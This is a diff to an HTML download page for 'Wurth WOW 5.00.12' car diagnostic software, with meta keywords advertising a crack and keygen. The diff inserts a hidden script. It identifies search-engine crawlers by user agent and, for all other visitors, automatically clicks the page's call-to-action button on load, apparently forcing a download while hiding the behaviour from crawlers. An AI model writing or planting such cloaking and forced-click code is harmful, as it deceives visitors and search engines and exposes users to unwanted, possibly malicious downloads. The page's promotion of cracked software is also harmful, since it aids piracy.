@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wurth WOW 5.00.12</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Wurth WOW 5.00.12 diagnostic software for car diagnostics and repair, compatible with Autocom, Delphi, ds150e, for Windows 7, 8, 10, and 11.">
     <meta name="keywords" content="Wurth WOW 5.00.12, Wurth WOW 5.00.12 download, Wurth WOW 5.00.12 free download, Wurth WOW 5.00.12 diagnostic software, Wurth WOW software, car diagnostics software, automotive repair tools, Wurth Group software, vehicle manuals database, Wurth WOW 5.00.12 crack, Wurth WOW 5.00.12 keygen, Wurth WOW 5.00.12 high speed download, Wurth WOW 5.00.12 installation, OBD adapter support, car service center software, Delphi alternative, AutoData comparison, electrical schematics software, car repair guides, technical specifications database, sensor location diagrams, vehicle maintenance recommendations, WOW installation tips, WOW software free download 2023, WOW diagnostic software free download, Wurth WOW diagnostic software download, WOW car repair software download, Wurth WOW free download installer, Wow Wurth diagnostic tools download, free download, free installer, Wurth WOW 5.00.12 Russian free download, Wurth WOW 5.00.12 Ukrainian free download, Wurth WOW 5.00.12 русский скачать, Wurth WOW 5.00.12 український завантажити, Wurth WOW 5.00.12 скачать бесплатно, Wurth WOW 5.00.12 завантажити безкоштовно">
     <style>
